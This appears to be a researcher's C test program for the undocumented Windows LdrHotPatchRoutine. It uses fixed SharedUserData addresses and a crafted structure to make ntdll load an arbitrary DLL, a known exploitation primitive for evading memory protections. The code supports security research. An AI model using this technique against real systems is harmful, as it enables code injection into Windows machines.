//
// File: LdrHotPatchRoutine.c
// Author: tombkeeper
// Date: 2010.11.3
// Description: LdrHotPatchRoutine testing
// 

#include <windows.h>

typedef struct _HotPatchBuffer
{
    ULONG Unknown01;            // &0x20000000 must not be 0
    ULONG Unknown02;
    USHORT PatcherNameOffset;
    USHORT PatcherNameLen;      // must be even, obviously
    USHORT PatcheeNameOffset;
    USHORT PatcheeNameLen;      // must not be 0
    USHORT UnknownNameOffset;
    USHORT UnknownNameLen;      // must be even, obviously
    USHORT PatcherName[0x10];   // 
    USHORT PatcheeName[0x10];   //
} HotPatchBuffer, PHotPatchBuffer;

HotPatchBuffer hpb;
USHORT Patcher[] = L"hello.dll";
USHORT Patchee[] = L"ntdll.dll";

int main( int argc, char **argv )
{
    FARPROC pLdrHotPatchRoutine;
    FARPROC pRtlUserThreadStart;
    // pLdrHotPatchRoutine = GetProcAddress( LoadLibrary("ntdll.dll"), "LdrHotPatchRoutine" );
    pLdrHotPatchRoutine = (FARPROC)*(DWORD*)(0x7ffe0350);
    pRtlUserThreadStart = (FARPROC)*(DWORD*)(0x7ffe0360);

    hpb.Unknown01 = 0x20000000;
    hpb.Unknown02 = 0x00000000;
    hpb.PatcherNameOffset = 0x14;
    hpb.PatcherNameLen = sizeof(Patcher)-2;
    hpb.PatcheeNameOffset = 0x34;
    hpb.PatcheeNameLen = sizeof(Patchee)-2;
    hpb.UnknownNameOffset = 0x1212;
    hpb.UnknownNameLen = 0x4;
    wcsncpy( hpb.PatcherName, Patcher, 0x10 );
    wcsncpy( hpb.PatcheeName, Patchee, 0x10 );

    __asm int 3
    pLdrHotPatchRoutine(&hpb);
    /*
    __asm
    {
        mov eax, dword ptr ds:[0x7ffe0350]  //LdrHotPatchRoutine
        lea ebx, hpb
        jmp dword ptr ds:[0x7ffe0360]  //RtlUserThreadStart
    }
    */
    return 0;
}
